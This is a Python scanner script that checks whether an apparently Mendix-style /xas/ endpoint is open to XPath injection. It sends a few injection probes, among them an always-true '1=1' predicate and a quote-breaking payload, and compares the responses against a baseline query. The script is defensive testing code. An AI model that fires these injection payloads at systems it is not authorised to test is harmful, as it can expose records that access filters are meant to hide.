#!/usr/bin/env python3
"""
Test whether the /xas/ XPath endpoint is vulnerable to XPath injection.
TSU-08

Sends a small set of safe read-only injection probes and detects anomalous responses
compared to the baseline (legitimate XPath query returning 0 results).

Usage: python check_xpath_injection.py <url> <entity>
  entity example: MyModule.MyEntity
Output: JSON to stdout
"""
import json
import sys
import requests


# Safe, read-only probes — no writes or deletes
INJECTION_PAYLOADS = [
    ("or_true", "//{entity}[1=1]"),
    ("string_break", "//{entity}[Name=']"),
    ("wildcard_descend", "//{entity}//.."),
    ("double_slash", "//{entity}[contains(Name,'')]"),
]


def _query(xas: str, xpath: str) -> tuple[int, object]:
    payload = {
        "action": "retrieve_by_xpath",
        "params": {"xpath": xpath, "schema": {"amount": 1, "offset": 0}, "count": True, "aggregates": False},
    }
    try:
        resp = requests.post(xas, json=payload, timeout=5)
        return resp.status_code, resp.json() if resp.ok else resp.text[:200]
    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
        return None, str(e)


def check_xpath_injection(url: str, entity: str) -> dict:
    xas = url.rstrip("/") + "/xas/"
    findings = []

    # Baseline: query with no results expected
    baseline_status, baseline_body = _query(xas, f"//{entity}[Name='__mxsploit_probe_unlikely__']")

    for name, template in INJECTION_PAYLOADS:
        xpath = template.replace("{entity}", entity)
        status, body = _query(xas, xpath)
        anomalous = status != baseline_status or (
            isinstance(body, dict) and isinstance(baseline_body, dict)
            and body.get("count", 0) != baseline_body.get("count", 0)
            and body.get("count", 0) > 0
        )
        findings.append({
            "probe": name,
            "xpath": xpath,
            "status_code": status,
            "anomalous": anomalous,
        })

    vulnerable = any(f["anomalous"] for f in findings)
    return {
        "entity": entity,
        "vulnerable": vulnerable,
        "baseline_status": baseline_status,
        "probes": findings,
        "error": None,
    }


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(json.dumps({"error": "usage: check_xpath_injection.py <url> <entity>"}))
        sys.exit(1)
    print(json.dumps(check_xpath_injection(sys.argv[1], sys.argv[2]), indent=2))
